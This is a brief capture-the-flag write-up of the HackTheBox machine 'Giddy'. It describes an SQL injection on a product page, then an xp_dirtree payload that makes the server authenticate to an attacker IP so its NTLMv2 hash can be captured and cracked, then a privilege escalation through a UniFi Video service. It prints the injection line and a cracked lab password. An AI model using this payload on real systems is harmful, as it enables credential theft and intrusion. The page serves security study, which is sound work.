# Giddy -- HackTheBox (write-up)

**Difficulty:** Medium
**Box:** Giddy (HackTheBox)
**Author:** dkrxhn
**Date:** 2024-09-03

---

## TL;DR

### SQL injection on a product page allowed capturing an NTLMv2 hash via xp_dirtree, cracked it to get a shell as Stacy, then privesc through a Ubiquiti UniFi Video service hijack (required AV bypass).

---

## Enumeration

![Nmap results](images/giddy-htb_1.png)

![Web page](images/giddy-htb_2.png)

![Directory enum](images/giddy-htb_3.png)

![More enum](images/giddy-htb_4.png)

![HTTP service](images/giddy-htb_5.png)

![Web app](images/giddy-htb_6.png)

![Product page](images/giddy-htb_7.png)

HTTPS:

![HTTPS](images/giddy-htb_8.png)

![Product categories](images/giddy-htb_9.png)

![SQL app](images/giddy-htb_10.png)

![Product listing](images/giddy-htb_11.png)

---

## SQL injection

Tested with a single quote `'`:

![SQL error](images/giddy-htb_12.png)

![Error details](images/giddy-htb_13.png)

Confirmed injection:

![Confirmed SQLi](images/giddy-htb_14.png)

Used `xp_dirtree` to force NTLM authentication:

```
; EXEC master..xp_dirtree '\\10.10.14.93\test'; --
```

(URL-encoded in the request)

![Hash captured](images/giddy-htb_15.png)

Cracked the NTLMv2 hash with john:

![John result](images/giddy-htb_16.png)

- `Stacy:xNnWo6272k7x`

![Shell access](images/giddy-htb_17.png)

---

## Privilege escalation

Process hijack related to UniFi Video found in Stacy's Documents directory. Followed 0xdf's writeup because it requires AV bypass with Ebowla.

---

## Lessons & takeaways

- SQL injection with `xp_dirtree` is an effective way to capture NTLMv2 hashes without needing direct command execution
- Always check for service-related files in user home directories for privesc clues
